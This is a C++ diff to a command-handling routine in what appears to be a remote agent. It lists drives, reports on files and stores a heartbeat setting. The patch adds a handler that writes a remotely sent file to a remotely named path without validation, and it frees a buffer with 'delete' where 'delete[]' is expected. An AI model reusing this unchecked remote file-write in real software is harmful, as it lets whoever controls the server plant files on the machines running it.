@@ -223,6 +223,8 @@ int __stdcall fileMission() {
 				char* sendbuf = buildCmd(drivers, drivers_len, MISSION_TYPE_DRIVE);
 
 				ret = packet.postCmd(CMD_SEND_DRIVER, sendbuf, drivers_len+sizeof(MY_CMD_PACKET));
+
+				delete sendbuf;
 			}
 			else if (pack->type == MISSION_TYPE_FILE || pack->type == MISSION_TYPE_DIR)
 			{
@@ -251,6 +253,14 @@ int __stdcall fileMission() {
 				MyJson json(JSON_CONFIG_FILENAME);
 				json.insert(KEYNAME_HEARTBEART_INTERVAL, s.c_str(), JSON_TYPE_STRING);
 				json.saveFile();
+			}
+			else if (pack->type == MISSION_TYPE_UPLOAD)
+			{
+				string fn = string(pack->value, pack->len);
+				MY_CMD_PACKET * pack2 = (MY_CMD_PACKET*)((char*)pack + sizeof(MY_CMD_PACKET) + pack->len);
+				char* file = pack2->value;
+				int filesize = pack2->len;
+				int ret = FileHelper::fileWriter(fn.c_str(), file, filesize, TRUE);
 			}
 			datalen = packet.m_protocol->m_respLen;
 			data = packet.m_protocol->m_resp;
